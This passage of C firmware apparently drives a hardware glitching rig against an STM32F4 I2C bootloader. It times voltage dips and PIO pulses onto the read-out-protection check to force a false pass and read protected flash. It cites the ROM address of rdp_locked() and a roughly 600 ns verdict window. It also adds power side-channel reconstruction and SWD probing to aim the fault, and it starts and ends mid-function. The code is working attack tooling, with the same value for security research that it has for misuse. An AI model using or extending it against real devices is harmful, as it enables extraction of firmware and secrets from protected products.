        if (win == 2) i2cgate_dip_hook();   // post-STOP window fires inline
        if (!addr_ok) {
            addr_fail++;
            reentries++;
            i2c_bl_enter(); sleep_ms(60);   // bootloader lost — re-boot it
            i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);  // re-warm: else the NEXT
            continue;                                    // attempt eats a cold-slave NACK
        }
        uint16_t vmin_raw = i2cgate_vmin_raw;
        uint32_t dip_us = i2cgate_dip_us;

        // verdict: poll the status; ACK means the check passed (or was corrupted)
        bool verdict = false;
        bool bus_alive = i2c_bl_wait_status(a, 100, &verdict);

        if (!bus_alive) {
            addr_fail++;
            reentries++;
            i2c_bl_enter(); sleep_ms(60);   // BOR reboot / stuck bus: re-boot the bootloader
            i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);  // re-warm (see above)
            continue;
        }

        // A NACK only counts as a calibration hit when the rail actually dipped:
        // a full-rail reading means the glitch never fired and this NACK is
        // meaningless (e.g. bootloader wedged). Track those separately.
        bool dipped = (vmin_raw <= i2cgate_thresh_raw + 64);

        if (verdict) {
            ack_wins++;
            // complete the READ (address + length + data frames)
            uint8_t data[16] = {0};
            if (i2c_bl_read_frames(a, 0x08000000u, data, 16)) {
                bool allff = true;
                for (int j = 0; j < 16; j++) if (data[j] != 0xFF) allff = false;
                if (allff) reads_blank_ff++; else reads_nonff++;
                // per-shot ACK log: all-0xFF is INCONCLUSIVE (blank/blocked/poison);
                // a non-FF read is the real signal — at RDP0 it must match the known
                // marker to prove the path, at RDP1 it is the dump.
                uart_cli_printf("  [%lu] win%lu dip %.2fV %luus: ACK + READ: %02X %02X %02X %02X %02X %02X %02X %02X%s\r\n",
                                (unsigned long)i + 1, (unsigned long)win, vmin_raw * 3.3f / 4095.0f,
                                (unsigned long)dip_us, data[0], data[1], data[2], data[3],
                                data[4], data[5], data[6], data[7],
                                allff ? "  (all-FF: INCONCLUSIVE)" : "  *** NON-FF (real content) ***");
            } else {
                read_fail++;
                uart_cli_printf("  [%lu] win%lu dip %.2fV %luus: ACK but read frames failed\r\n",
                                (unsigned long)i + 1, (unsigned long)win, vmin_raw * 3.3f / 4095.0f,
                                (unsigned long)dip_us);
            }
        } else {
            if (dipped) {
                nack++;
                // calibration hits: a NACK on a dipped rail at RDP0 is a corrupted check
                uart_cli_printf("  [%lu] win%lu dip %.2fV %luus: NACK (check corrupted? at RDP0 this is a HIT)\r\n",
                                (unsigned long)i + 1, (unsigned long)win, vmin_raw * 3.3f / 4095.0f,
                                (unsigned long)dip_us);
            } else {
                nack_nodip++;   // glitch never fired — verdict not meaningful
            }
        }

        // step the depth (auto-sweep mode)
        if (depth_step && v_threshold > v_min_depth) v_threshold -= depth_step / 1000.0f;
    }

    uart_cli_printf("I2CGATE: %lu attempts — ACK %lu (non-FF/real %lu, all-FF/inconclusive %lu, read-fail %lu), NACK-on-dip %lu, NACK-no-dip %lu, bus-dead/no-addr %lu (%lu re-entries)\r\n",
                    (unsigned long)attempts, (unsigned long)ack_wins, (unsigned long)reads_nonff,
                    (unsigned long)reads_blank_ff, (unsigned long)read_fail, (unsigned long)nack,
                    (unsigned long)nack_nodip, (unsigned long)addr_fail, (unsigned long)reentries);
    // Validity gate (rdp-payload-check): the data path is only PROVEN when a non-FF
    // read recovers the known RDP0 marker. All-FF ACKs do NOT prove it — a negative
    // result at RDP1 is only trustworthy once reads_nonff>0 was seen at RDP0 here.
    if (reads_nonff == 0) {
        uart_cli_send("I2CGATE: WARNING — zero non-FF reads: data path NOT proven. At RDP0 flash a known marker at 0x08000000 and confirm it is read back before trusting any RDP1 negative.\r\n");
    }
    if (nack > 0) {
        uart_cli_printf("I2CGATE: dipped-NACK count %lu (at RDP0 = corrupted-check hits; at RDP1 = normal gated response, NOT a bypass) vs %lu ACKs\r\n",
                        (unsigned long)nack, (unsigned long)ack_wins);
    } else {
        uart_cli_send("I2CGATE: no corrupted checks yet at this depth/timing\r\n");
    }
}

// ============================================================================
// I2CPROBE — where in the I2C clock-stretch does the RDP check actually run?
//
// SWD-attach while the target is mid-stretch (inside the boot ROM's post-0x11
// processing), halt the core, read PC. Repeat across a sweep of delays from
// the STOP edge. The PC histogram shows:
//   - when rdp_locked() (0x1FFF0B94) executes relative to the STOP edge
//   - where the cmp / `it ne; movne` verdict instructions sit
// This maps the precise window the I2CPULSE PIO pulse must hit. The user's
// direction: aim at corrupting the JMP/COMPARE (control flow / flags), not
// the read value — a cmp-flag corruption can produce a false-pass at RDP1,
// whereas corrupting the OPTCR read value only produces false-fails.
//
// NOTE (bench-proven earlier): halting the core while the ROM's I2C slave is
// clock-stretching wedges the bootloader (GV stuck afterwards) — so each
// probe attempt costs one i2c_bl_enter() re-boot. That's fine: the PC data
// is the point.
// ============================================================================
void target_power_i2cprobe(uint32_t samples, uint32_t delay_us) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern bool swd_clear_errors(void);
    extern bool swd_read_core_reg(uint8_t reg, uint32_t *value);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool i2c_bl_send_cmd_raw(uint8_t a, uint8_t cmd);

    if (power_group_glitch_blocked()) return;
    if (samples == 0) samples = 1;
    if (samples > 500) samples = 500;
    if (delay_us > 1000000) delay_us = 1000000;   // cap: the main loop must stay responsive

    uart_cli_printf("I2CPROBE: halt mid-stretch, sweep PC at %luus after 0x11 cmd frame (%lu samples)\r\n",
                    (unsigned long)delay_us, (unsigned long)samples);

    // one shared histogram over PC (bucket by ROM address, 2-byte granularity)
    #define PROBE_BUCKETS 24
    struct { uint32_t pc; uint32_t n; } hist[PROBE_BUCKETS] = {0};
    int nb = 0;
    uint32_t halt_fail = 0, cmd_fail = 0;
    // audit-fix tallies: how the core was found at the moment of halt
    uint32_t n_clean = 0, n_prehalt = 0, n_presleep = 0, n_exc = 0;

    swd_init();
    uint8_t a = I2C_BL_ADDR7_DEFAULT;
    for (uint32_t i = 0; i < samples; i++) {
        // fresh bootloader each sample. CRITICAL: POR, not nRST — C_DEBUGEN
        // survives nRST (bench-proven), so after the previous sample's halt the
        // core would boot debug-held and never answer GET. The first entry after
        // an SWD session sees swd_is_connected()==false and would take the nRST
        // path; force the POR path by power-cycling here explicitly.
        target_power_cycle(150);
        i2c_bl_enter();
        sleep_ms(60);
        if (!i2c_bl_get(a)) { cmd_fail++; continue; }

        // warm-up: the FIRST command frame after a fresh entry+GET always
        // NACKs (bench-consistent across I2CGATE) — fire an ungated 0x02 raw
        // frame to settle the slave, then the timed 0x11 lands cleanly
        i2c_bl_send_cmd_raw(a, 0x02);
        sleep_ms(5);

        // CONTROL (delay_us == 999999): skip the 0x11 frame entirely — halt
        // immediately after entry+GET+warm-up. Isolates whether the HardFault
        // state is caused by the 0x11 command itself or by the ROM/SWD setup.
        if (delay_us == 999999u) {
            bool connected = false;
            for (int r = 0; r < 10 && !connected; r++) {
                connected = swd_connect() && swd_clear_errors();
                if (!connected) sleep_ms(2);
            }
            if (!connected || !swd_halt()) { halt_fail++; swd_deinit(); continue; }
            uint32_t pc0 = 0, xp0 = 0;
            bool got0 = swd_read_core_reg(15, &pc0) && swd_read_core_reg(16, &xp0);
            swd_resume();
            swd_deinit();
            if (!got0) { halt_fail++; continue; }
            uart_cli_printf("  [ctl %lu] PC=0x%08lX xPSR=0x%08lX (no 0x11 sent)\r\n",
                            (unsigned long)i + 1, (unsigned long)pc0, (unsigned long)xp0);
            continue;
        }

        // send 0x11 cmd frame, return immediately (ROM enters post-processing)
        if (!i2c_bl_send_cmd_raw(a, 0x11)) { cmd_fail++; continue; }

        // wait the requested delay from the STOP edge, then SWD-attach + halt
        sleep_us(delay_us);
        bool connected = false;
        for (int r = 0; r < 10 && !connected; r++) {
            connected = swd_connect() && swd_clear_errors();
            if (!connected) sleep_ms(2);
        }
        if (!connected) { halt_fail++; swd_deinit(); continue; }
        // PRE-HALT state (audit fix): read DHCSR BEFORE we halt, so the PC we
        // read is interpretable. S_HALT(bit1)=core was ALREADY stopped before we
        // touched it (prior fault/lockup/debug-held → PC is NOT a freshly-caught
        // running addr); S_SLEEP(bit18)=core was in WFI/WFE (waiting, e.g. poll);
        // S_LOCKUP(bit19)=locked up. A clean catch = none of these set pre-halt.
        uint32_t dhcsr_pre = 0;
        swd_read_mem(0xE000EDF0, &dhcsr_pre, 1);
        if (!swd_halt()) { halt_fail++; swd_deinit(); continue; }
        // DFSR (0xE000ED30): why the core is in debug. HALTED(bit0)=our C_HALT
        // request stopped it (expected for a clean catch); BKPT/DWTTRAP/VCATCH=
        // something else fired. Distinguishes "we halted a running core" from
        // "the core was already trapped and our halt is a no-op on a fault state."
        uint32_t dfsr = 0;
        swd_read_mem(0xE000ED30, &dfsr, 1);

        uint32_t pc = 0, xpsr = 0, sp = 0;
        bool got = swd_read_core_reg(15, &pc) && swd_read_core_reg(16, &xpsr) &&
                   swd_read_core_reg(13, &sp);
        uint32_t stk_pc = 0, stk_lr = 0, stk_cfsr = 0, stk_bfar = 0;
        if (got && sp >= 0x20000000 && sp < 0x20018000) {
            // basic frame: r0,r1,r2,r3,r12,lr,ret_addr(<-PC),xPSR at SP+0x14
            uint32_t w[8];
            if (swd_read_mem(sp, w, 8) == 8) { stk_lr = w[5]; stk_pc = w[6]; }
            swd_read_mem(0xE000ED28, &stk_cfsr, 1);   // CFSR
            swd_read_mem(0xE000ED38, &stk_bfar, 1);   // BFAR
        }
        swd_resume();
        swd_deinit();
        if (!got) { halt_fail++; continue; }

        // audit-fix classification of HOW the core was found:
        //   exc     = halt returned an EXC_RETURN PC (exception active = faulted)
        //   prehalt = S_HALT already set before our halt (core was already stopped)
        //   presleep= S_SLEEP set (core was in WFI/WFE — waiting/polling, NOT the cmp)
        //   clean   = none of the above + DFSR.HALTED → we caught a RUNNING core at PC
        bool is_exc  = ((pc & 0xF0000000) == 0xF0000000);
        bool pre_h   = (dhcsr_pre & 0x20000) != 0;  // S_HALT (DHCSR bit17)
        bool pre_s   = (dhcsr_pre & 0x40000) != 0;  // S_SLEEP (DHCSR bit18)
        if      (is_exc) n_exc++;
        else if (pre_h)  n_prehalt++;
        else if (pre_s)  n_presleep++;
        else             n_clean++;

        // diagnostic split: EXC_RETURN (high bits set) vs real code address.
        // 0xFFFFFFFE = EXC_RETURN (exception active); xPSR low byte = exception
        // number (3 = HardFault). 0x1FFFxxxx = boot ROM code (the target of the
        // recon); 0x0800xxxx = flash code.
        if (is_exc) {
            uart_cli_printf("  [%lu] EXC_RETURN=0x%08lX exc#=%lu faulted-at PC=0x%08lX LR=0x%08lX CFSR=0x%08lX BFAR=0x%08lX  (preDHCSR=0x%08lX DFSR=0x%08lX)\r\n",
                            (unsigned long)i + 1, (unsigned long)pc,
                            (unsigned long)(xpsr & 0xFF), (unsigned long)stk_pc,
                            (unsigned long)stk_lr, (unsigned long)stk_cfsr,
                            (unsigned long)stk_bfar,
                            (unsigned long)dhcsr_pre, (unsigned long)dfsr);
        }

        // bucket
        int found = -1;
        for (int b = 0; b < nb; b++) if (hist[b].pc == pc) { found = b; break; }
        if (found < 0 && nb < PROBE_BUCKETS) { found = nb; hist[nb].pc = pc; nb++; }
        if (found >= 0) hist[found].n++;
        if (i < 8) uart_cli_printf("  [%lu] PC=0x%08lX xPSR=0x%08lX preDHCSR=0x%08lX%s%s DFSR=0x%08lX%s\r\n",
                                   (unsigned long)i + 1, (unsigned long)pc, (unsigned long)xpsr,
                                   (unsigned long)dhcsr_pre,
                                   (dhcsr_pre & 0x20000) ? " [pre-HALTED]" : "",
                                   (dhcsr_pre & 0x40000) ? " [pre-SLEEP]" : "",
                                   (unsigned long)dfsr,
                                   (dfsr & 0x1) ? " [HALTED]" : "");
    }

    uart_cli_printf("I2CPROBE: %lu samples — halt-fail %lu, cmd-fail %lu\r\n",
                    (unsigned long)samples, (unsigned long)halt_fail, (unsigned long)cmd_fail);
    // audit-fix verdict: only 'clean-caught' PCs are trustworthy running-core
    // locations. pre-HALT/pre-SLEEP/EXC means the PC is NOT a freshly caught
    // running addr, so a histogram dominated by those says nothing about where
    // the cmp runs — it says the halt can't catch the core there.
    uart_cli_printf("I2CPROBE: catch-state — clean-caught %lu, pre-HALTED %lu, pre-SLEEP %lu, EXC/faulted %lu  (only clean-caught PCs locate running code)\r\n",
                    (unsigned long)n_clean, (unsigned long)n_prehalt,
                    (unsigned long)n_presleep, (unsigned long)n_exc);
    uart_cli_send("  PC histogram:\r\n");
    for (int b = 0; b < nb; b++)
        uart_cli_printf("    0x%08lX x%lu\r\n", (unsigned long)hist[b].pc, (unsigned long)hist[b].n);
}

// ============================================================================
// I2CPULSE — PIO one-shot rail pulse inside the I2C clock-stretch.
//
// The RDP0 ADC-dip calibration showed post-STOP dips corrupt the check 47% of
// the time — but the dip is µs-coarse, and at RDP1 a false-pass needs the
// corruption to land on the cmp/`it ne; movne` verdict pair (~ns window).
// User direction: corrupt the compare/control-flow, not the read value.
//
// ROM analysis (tmp/f401_rom_disasm.txt): the whole rdp_locked() check runs
// ~0.6us after the cmd byte's I2C ACK (dispatch + wrapper + 12-cycle check @
// 48MHz) — the cmp/`it ne; movne` verdict window is only ~600ns wide, and at
// RDP1 a corrupted OPTCR read value can only produce NACK. A false-pass needs
// the pulse to hit the compare/control-flow itself. The verdict anchors to the
// ACK-slot SCL rise of the cmd byte (post-byte hooks run ~400us too late, after
// the trailing dly()s), so the pulse fires from INSIDE the ACK slot via
// i2c_bl_send_cmd_ackhook and the PIO pause sweeps 0.6us+slack with 6.67ns
// resolution. At RDP1: ACK + readable flash = GATE BYPASSED.
// NACKs are the normal gated response and carry no signal except bus-liveness.
// ============================================================================
static bool i2cpulse_fired_this_shot = false;

static uint16_t i2cpulse_vmin_raw = 4095;  // deepest ADC sample seen per shot
static void i2cpulse_ackhook(void) {       // fired inside the cmd byte's ACK slot,
    i2cpulse_fired_this_shot = true;       // before the ACK SCL rise (see
    i2cpulse_fire();                       // i2c_wr_ack_hook)
    // depth probe: continuous ADC poll for 50us after the fire — the single
    // post-fire sample read recovery, not the dip (all geometries read
    // ~2.87V regardless). Track the true minimum over the whole dip.
    adc_power_init();
    adc_select_input(ADC_POWER_CHAN);
    uint64_t t0 = time_us_64();
    while ((time_us_64() - t0) < 50) {
        uint16_t v = adc_read();
        if (v < i2cpulse_vmin_raw) i2cpulse_vmin_raw = v;
    }
}

void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_hi,
                           uint32_t pause_step, uint32_t width_cycles) {
    if (power_group_glitch_blocked()) return;
    if (attempts == 0) attempts = 1;
    if (attempts > 2000) attempts = 2000;
    if (pause_step == 0) pause_step = 1;

    uart_cli_printf("I2CPULSE: PIO pulse swept %lu..%lus step %lus, width %lu ticks (6.67ns each), %lu shots\r\n",
                    (unsigned long)pause_lo, (unsigned long)pause_hi, (unsigned long)pause_step,
                    (unsigned long)width_cycles, (unsigned long)attempts);

    if (!i2cpulse_start(width_cycles)) {
        uart_cli_send("ERROR: I2CPULSE: SM start failed (EXTERNAL mode or ARMED?)\r\n");
        return;
    }

    // entry: boot the target into the I2C bootloader
    target_power_ensure_on();
    i2c_bl_enter();
    sleep_ms(60);
    uint8_t a = I2C_BL_ADDR7_DEFAULT;
    if (!i2c_bl_get(a)) {
        uart_cli_send("ERROR: I2CPULSE: bootloader not responding (GET failed)\r\n");
        i2cpulse_stop();
        return;
    }
    // warm-up: the FIRST command frame after a fresh entry+GET always NACKs
    // (cold slave) — fire an ungated 0x02 raw frame to settle it (same as
    // I2CGATE), else shot 1 bus-deads and cascades a re-entry every campaign
    i2c_bl_send_cmd_raw(a, 0x02);
    sleep_ms(5);

    // NOW claim the pulse geometry. Must be AFTER the entry sequence:
    // power_drive() re-drives all three gang pins as SIO outputs, undoing the
    // release done in i2cpulse_start — the pulse would sink GP10 against two
    // live 12mA sources (bench-proven sag floor ~2.87V, useless).
    i2cpulse_reattach();

    // See I2CGATE: all-0xFF is INCONCLUSIVE, non-FF is the only meaningful read.
    uint32_t ack_wins = 0, nack = 0, addr_fail = 0;
    uint32_t reads_blank_ff = 0, reads_nonff = 0, read_fail = 0;
    uint32_t reentries = 0;
    for (uint32_t i = 0; i < attempts; i++) {
        uint32_t pause = pause_lo + (i % ((pause_hi - pause_lo) / pause_step + 1)) * pause_step;
        uint32_t width = width_cycles;

        i2cpulse_push_pause(pause);

        // send the 0x11 cmd frame firing the pulse from INSIDE the cmd byte's
        // ACK slot (before the ACK SCL rise) — the hook is the anchor; the
        // PIO pause then sweeps the pulse across the ~0.6us dispatch +
        // rdp_locked() + verdict window (plus slack for frame-geometry
        // uncertainty). Then poll the verdict.
        i2cpulse_fired_this_shot = false;
        i2cpulse_vmin_raw = 4095;
        bool addr_ok = i2c_bl_send_cmd_ackhook(a, 0x11, i2cpulse_ackhook);

        bool verdict = false;
        bool bus_alive = false;
        if (addr_ok) {
            bus_alive = i2c_bl_wait_status(a, 100, &verdict);
        }

        if (!addr_ok || !bus_alive) {
            addr_fail++;
            reentries++;
            uart_cli_printf("  [%lu] pause %lus: bus-dead/no-addr (disturbance?)\r\n",
                            (unsigned long)i + 1, (unsigned long)pause);
            // RE-GANG before i2c_bl_enter: its power-cycle drives POWER_MASK
            // via gpio_set_mask, which does nothing on input-released pins —
            // released pins during re-entry left the target unpowered and
            // every shot after the first bus-deaded (the 100/100 cascade).
            gpio_set_dir(11, GPIO_OUT); gpio_put(11, 1);
            gpio_set_dir(12, GPIO_OUT); gpio_put(12, 1);
            i2c_bl_enter(); sleep_ms(60);
            i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);  // re-warm: else the NEXT
                                            // attempt eats a cold-slave NACK (BUG:
                                            // the pre-loop warm-up was not repeated
                                            // on re-entry, poisoning calibration)
            // hand all three gang pins back to the PIO sink (i2cpulse_start
            // geometry — i2c_bl_enter's power-cycle re-ganged them to SIO)
            i2cpulse_reattach();
            continue;
        }

        if (verdict) {
            ack_wins++;
            uint8_t data[16] = {0};
            if (i2c_bl_read_frames(a, 0x08000000u, data, 16)) {
                bool allff = true;
                for (int j = 0; j < 16; j++) if (data[j] != 0xFF) allff = false;
                if (allff) reads_blank_ff++; else reads_nonff++;
                uart_cli_printf("  [%lu] pause %lus w%lus: *** ACK + READ: %02X %02X %02X %02X %02X %02X %02X %02X%s ***\r\n",
                                (unsigned long)i + 1, (unsigned long)pause, (unsigned long)width,
                                data[0], data[1], data[2], data[3],
                                data[4], data[5], data[6], data[7],
                                allff ? " (all-FF: INCONCLUSIVE)" : " NON-FF (real content)");
            } else {
                read_fail++;
                uart_cli_printf("  [%lu] pause %lus w%lus: ACK but read frames failed\r\n",
                                (unsigned long)i + 1, (unsigned long)pause, (unsigned long)width);
            }
        } else {
            nack++;   // at RDP1 this is the normal gated response — no signal
            if ((i % 100) == 99)
                uart_cli_printf("  [%lu] pause %lus: NACK, rail min %.2fV\r\n",
                                (unsigned long)i + 1, (unsigned long)pause,
                                i2cpulse_vmin_raw * 3.3f / 4095.0f);
        }
    }

    i2cpulse_stop();

    uart_cli_printf("I2CPULSE: %lu shots — ACK %lu (non-FF/real %lu, all-FF/inconclusive %lu, read-fail %lu), NACK %lu, bus-dead/no-addr %lu (%lu re-entries)\r\n",
                    (unsigned long)attempts, (unsigned long)ack_wins, (unsigned long)reads_nonff,
                    (unsigned long)reads_blank_ff, (unsigned long)read_fail, (unsigned long)nack,
                    (unsigned long)addr_fail, (unsigned long)reentries);
    if (reads_nonff > 0) {
        uart_cli_send("I2CPULSE: *** NON-FF READ PRESENT — inspect the ACK lines (real flash content) ***\r\n");
    } else {
        uart_cli_send("I2CPULSE: no non-FF read — data path NOT proven here. Validate at RDP0 with a known marker at 0x08000000 before trusting any RDP1 negative.\r\n");
    }
}

// ============================================================================
// ETSRECON — equivalent-time-sampling power recon of the RDP-check window.
//
// The RP2350 ADC is fixed at ~500 ksps (2us/sample) — far too slow to resolve
// the ~0.6us RDP check directly, and it has no precise external conversion
// trigger. But the I2C ACK-slot anchor is DETERMINISTIC, so we reconstruct a
// sub-sample power trace the classic way: repeat the deterministic event many
// times, and on each repeat sample the rail (ADC1/GP27 shunt) at a precisely
// swept delay after t0 (the cmd-byte ACK rise). Binning by delay-phase builds an
// effective ~ns-resolution trace from the slow ADC.
//
// Decoupling (why this images the check instead of shifting it): the post-ACK
// hook fires AFTER scl_hi (t0) while the master holds SCL high. The ROM runs the
// check ~0.6us after t0 regardless of further clocking, so busy-waiting then
// sampling moves ONLY the sample phase, not the check. No glitch is fired, so the
// target never BORs — we can loop fast without re-entry.
//
// This is the recon the halt-probe cannot do (SWD-attach latency >> the window).
// Caveat: a single instruction's shunt-current delta is tiny; heavy per-phase
// averaging (reps) is needed, and it may only resolve the check REGION, not one
// instruction — which is all we need to aim the I2CPULSE pause sweep.
// ============================================================================
static volatile uint32_t ets_delay_cycles = 0;
static volatile uint16_t ets_sample_raw = 0;
static void ets_post_hook(void) {
    busy_wait_at_least_cycles(ets_delay_cycles);   // phase delay after t0
    ets_sample_raw = (uint16_t)adc_read();          // ADC1 pre-selected (GP27 shunt)
}

void target_power_etsrecon(uint32_t phases, uint32_t reps) {
    extern bool i2c_bl_send_cmd_postackhook(uint8_t a, uint8_t cmd, void (*h)(void));
    if (phases == 0) phases = 80;  if (phases > 400) phases = 400;
    if (reps == 0)   reps   = 300; if (reps  > 5000) reps  = 5000;

    // Window to image: t0 .. t0 + SPAN_CYCLES (150MHz -> 6.667ns/cycle). The ROM
    // check latches ~0.6us (~90 cyc) after t0; 600 cycles (~4us) covers dispatch
    // + check + verdict + NACK with margin.
    const uint32_t SPAN_CYCLES = 600;
    static uint32_t ets_acc[400];
    for (uint32_t p = 0; p < phases; p++) ets_acc[p] = 0;

    adc_init();
    adc_select_input(1);           // ADC1 = GP27 shunt (power/current)

    uint8_t a = I2C_BL_ADDR7_DEFAULT;
    i2c_bl_enter(); sleep_ms(60);
    i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);   // warm-up (cold slave first-frame NACK)

    uart_cli_printf("ETSRECON: %lu phases x %lu reps, span %lu cyc (~%.2fus) after t0 (cmd-ACK), ADC1/GP27 shunt\r\n",
                    (unsigned long)phases, (unsigned long)reps, (unsigned long)SPAN_CYCLES,
                    SPAN_CYCLES * 6.667f / 1000.0f);
    uart_cli_send("ETSRECON: no glitch fired — target stays at its current RDP level.\r\n");

    uint32_t shot = 0;
    for (uint32_t r = 0; r < reps; r++) {
        for (uint32_t p = 0; p < phases; p++) {
            ets_delay_cycles = (p * SPAN_CYCLES) / phases;
            ets_sample_raw = 0;
            i2c_bl_send_cmd_postackhook(a, 0x11, ets_post_hook);
            ets_acc[p] += ets_sample_raw;
            // proactive re-entry insurance: the slave can wedge over thousands of
            // truncated frames; re-arm periodically (cheap, no BOR to recover).
            if (++shot % 2000 == 0) {
                i2c_bl_enter(); sleep_ms(40);
                i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);
            }
        }
    }

    // reconstruct + dump: find min/max for a crude ASCII profile so the check
    // region (a deviation from baseline) is visible at a glance.
    uint32_t vmin = 0xFFFFFFFF, vmax = 0;
    for (uint32_t p = 0; p < phases; p++) {
        uint32_t avg = ets_acc[p] / reps;
        if (avg < vmin) vmin = avg;
        if (avg > vmax) vmax = avg;
    }
    uint32_t span = (vmax > vmin) ? (vmax - vmin) : 1;
    uart_cli_printf("ETSRECON: reconstructed trace (raw %lu..%lu, delta %lu LSB):\r\n",
                    (unsigned long)vmin, (unsigned long)vmax, (unsigned long)span);
    for (uint32_t p = 0; p < phases; p++) {
        uint32_t avg = ets_acc[p] / reps;
        float t_us = (p * (float)SPAN_CYCLES / phases) * 6.667f / 1000.0f;
        int bars = (int)((avg - vmin) * 40u / span);
        char bar[41];
        for (int b = 0; b < 40; b++) bar[b] = (b < bars) ? '#' : ' ';
        bar[40] = '\0';
        uart_cli_printf("  t=+%5.3fus raw=%4lu |%s|\r\n", t_us, (unsigned long)avg, bar);
    }
    uart_cli_send("ETSRECON: done. A bump ~0.6us after t0 = the dispatch/RDP-check region (aim the I2CPULSE pause there).\r\n");
}

// Control experiment for ROMFPB: the identical early-attach flow (POR with
// BOOT0=1, SWD connect inside the boot window, halt, resume, immediate I2C)
// but NO FPB configuration at all. Bench result (kept as a regression check):
// GV stuck even with no patch — the halt itself is what kills the bootloader's
// I2C, which is why ROMFPB patches via AHB-AP with the core running.
void target_power_romfpb_control(void) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern bool swd_clear_errors(void);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool i2c_bl_gv(uint8_t addr7);
    extern void i2c_pins_reinit(void);

    uart_cli_send("ROMFPB-CTL: early attach + halt + resume, NO FPB (control)\r\n");
    target_power_ensure_on();
    swd_init();
    if (!swd_connect() || !swd_clear_errors()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed before bootloader entry\r\n");
        return;
    }
    gpio_init(PIN_BOOT0); gpio_set_dir(PIN_BOOT0, GPIO_OUT); gpio_put(PIN_BOOT0, 1);
    gpio_init(PIN_BOOT1); gpio_set_dir(PIN_BOOT1, GPIO_OUT); gpio_put(PIN_BOOT1, 0);
    i2c_pins_reinit();
    target_power_cycle(150);
    swd_init();
    bool connected = false;
    for (int i = 0; i < 20 && !connected; i++) {
        connected = swd_connect() && swd_clear_errors();
        if (!connected) sleep_ms(4);
    }
    if (!connected) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed during boot window\r\n");
        return;
    }
    if (!swd_halt()) {
        swd_deinit();
        uart_cli_send("ERROR: halt failed in early boot\r\n");
        return;
    }
    uint32_t pc = 0;
    swd_read_core_reg(15, &pc);
    uart_cli_printf("    halted early: pc=0x%08lX\r\n", (unsigned long)pc);
    uart_cli_send("[2] Resuming (no patch)...\r\n");
    if (!swd_resume()) {
        swd_deinit();
        uart_cli_send("ERROR: resume failed\r\n");
        return;
    }
    sleep_ms(5);
    uart_cli_send("[3] I2C GV...\r\n");
    bool gv_ok = i2c_bl_gv(0x39);
    if (gv_ok) {
        uart_cli_send("ROMFPB-CTL: GV ACKed with halt+resume, no patch => FPB remap itself\r\n");
        uart_cli_send("   breaks the ROM boot (or its SRAM table placement collides).\r\n");
    } else {
        uart_cli_send("ROMFPB-CTL: GV still stuck => early halt alone perturbs the bootloader;\r\n");
        uart_cli_send("   ROMFPB window must avoid halting (patch without halt / after AHB idle).\r\n");
    }
    swd_deinit();
}
// whether the RDP byte / any OPTCR bits moved away from the locked baseline. One SWD
// round-trip per attempt => sweeps offset x width far faster, mapping the window.
// CAVEATS (by design): (1) SWD is connected only AFTER the glitch, so it doesn't
// perturb the fault; (2) a transient shadow corruption can re-settle before the read
// (under-reports); (3) the flash-enforcement latch may differ from these OPTCR bits,
// so "no OPTCR change" is NOT proof of failure — confirm promising offsets with the
// full SHADOWBYPASS. Any OPTCR change (esp. RDP byte -> 0xAA) = the glitch reached the
// option-byte load.
void target_power_shadowscan(uint32_t max_attempts) {
    if (power_group_glitch_blocked()) return;
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern bool swd_connect(void);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info) return;
    uint32_t optcr_addr = info->flash_optr;   // F4: 0x40023C14
    if (max_attempts == 0) max_attempts = 5000;

    const uint32_t OFF_MIN = 5, OFF_MAX = 1500, OFF_STEP = 5;
    const uint32_t WIDTHS[] = {5, 10, 20, 40};
    const int NW = (int)(sizeof(WIDTHS) / sizeof(WIDTHS[0]));

    // Power on and read the baseline OPTCR.
    gpio_init(BOOT0_PIN); gpio_set_dir(BOOT0_PIN, GPIO_OUT); gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN); gpio_set_dir(BOOT1_PIN, GPIO_OUT); gpio_put(BOOT1_PIN, 0);
    gpio_set_dir(POWER_PIN1, GPIO_OUT); gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
    gpio_set_mask(POWER_MASK);
    sleep_ms(100);
    adc_power_init();

    uint32_t base = 0xFFFFFFFF;
    swd_init();
    bool bcon = swd_connect();
    bool brd = bcon && (swd_read_mem(optcr_addr, &base, 1) == 1);
    swd_deinit();
    if (!brd) { uart_cli_send("ERROR: could not read baseline OPTCR over SWD\r\n"); return; }
    uart_cli_printf("SHADOWSCAN: OPTCR @0x%08lX baseline=0x%08lX (RDP byte=0x%02lX), up to %lu attempts\r\n",
                    optcr_addr, base, (base >> 8) & 0xFF, max_attempts);
    uart_cli_send("Glitch POR + timed dip, then SWD-read OPTCR. Logging any change from baseline.\r\n");

    uint32_t off = OFF_MIN; int wi = 0;
    uint32_t attempt = 0, changes = 0, noconn = 0, rdp0 = 0;

    while (attempt < max_attempts) {
        attempt++;
        uint32_t width = WIDTHS[wi];

        // --- brownout POR (retain nothing needed here) + timed dip ---
        gpio_set_dir(POWER_PIN2, GPIO_IN); gpio_set_dir(POWER_PIN3, GPIO_IN);
        gpio_disable_pulls(POWER_PIN2); gpio_disable_pulls(POWER_PIN3);
        adc_select_input(ADC_POWER_CHAN);
        gpio_clr_mask(1u << POWER_PIN1);
        uint64_t tb = time_us_64();
        while (adc_read() > 1490) { if (time_us_64() - tb > 200000) break; }
        gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_set_mask(POWER_MASK);
        uint64_t t0 = time_us_64();
